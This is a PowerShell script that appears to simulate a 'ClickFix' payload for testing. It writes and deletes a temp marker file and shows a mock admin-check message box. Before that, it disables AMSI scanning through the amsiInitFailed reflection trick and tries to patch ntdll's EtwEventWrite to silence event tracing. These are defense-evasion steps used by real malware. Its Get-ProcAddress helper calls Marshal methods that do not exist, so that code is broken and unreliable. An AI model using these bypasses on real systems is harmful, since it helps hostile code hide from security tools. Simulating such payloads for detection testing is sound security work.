function Get-ProcAddress {
    param (
        [string]$module,
        [string]$proc
    )
    $m = [System.Runtime.InteropServices.Marshal]::GetModuleHandle($module)
    $addr = [System.Runtime.InteropServices.Marshal]::GetProcAddress($m, $proc)
    return $addr
}

try {
    $amsi = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
    $field = $amsi.GetField('amsiInitFailed', 'NonPublic,Static')
    $field.SetValue($null, $true)
} catch {}

try {
    $etwAddr = Get-ProcAddress "ntdll.dll" "EtwEventWrite"
    [System.Runtime.InteropServices.Marshal]::Copy([byte[]](0xC3), 0, $etwAddr, 1)
} catch {}

$marker = Join-Path $env:TEMP "clickfix_ran.txt"
"executed at $(Get-Date)" | Out-File -FilePath $marker -Encoding ASCII

Add-Type -AssemblyName System.Windows.Forms
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

if ($isAdmin) {
    [System.Windows.Forms.MessageBox]::Show("MOCK EXECUTED AS ADMIN", "ClickFix Test")
} else {
    [System.Windows.Forms.MessageBox]::Show("MOCK NOT ADMIN", "ClickFix Test")
}

Remove-Item $marker -Force -ErrorAction SilentlyContinue
